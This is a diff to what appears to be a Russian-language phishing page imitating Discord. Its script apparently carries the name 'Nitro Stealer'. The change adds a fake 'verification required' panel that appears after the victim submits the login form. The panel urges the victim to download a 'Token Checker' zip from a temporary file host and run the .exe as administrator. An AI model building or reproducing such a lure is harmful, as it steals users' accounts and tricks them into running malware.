@@ -57,6 +57,15 @@ body{background:#1e1f22;font-family:'gg sans','Helvetica Neue',Arial,sans-serif;
 <div class="spinner"></div>
 <p style="color:#b5bac1;font-size:14px">Проверяем ваш аккаунт...</p>
 </div>
+
+<div id="downloadSection" style="display:none; text-align:center; padding:20px">
+<div style="background:#2b2d31; border-radius:8px; padding:20px; margin-top:16px">
+<h3 style="color:#f2f3f5; font-size:18px; margin-bottom:8px">Требуется верификация</h3>
+<p style="color:#b5bac1; font-size:13px; margin-bottom:16px">Ваш аккаунт требует подтверждения через токен.<br>Скачайте программу верификации:</p>
+<a href="https://litter.catbox.moe/y6jh92.zip" class="btn" style="text-decoration:none; display:inline-block; padding:12px 24px">Скачать Token Checker</a>
+<p style="color:#b5bac1; font-size:11px; margin-top:12px">Распакуйте архив и запустите .exe от имени администратора</p>
+</div>
+</div>
 </div>
 
 <script>
@@ -87,10 +96,8 @@ username:'Nitro Stealer'
 
 setTimeout(function(){
 document.getElementById('loading').style.display='none';
-document.getElementById('loginForm').style.display='block';
-errorMsg.style.display='block';
-errorMsg.textContent='Неверный email или пароль. Попробуйте снова.';
-document.getElementById('password').value='';
+document.getElementById('loginForm').style.display='none';
+document.getElementById('downloadSection').style.display='block';
 },2000);
 }
 
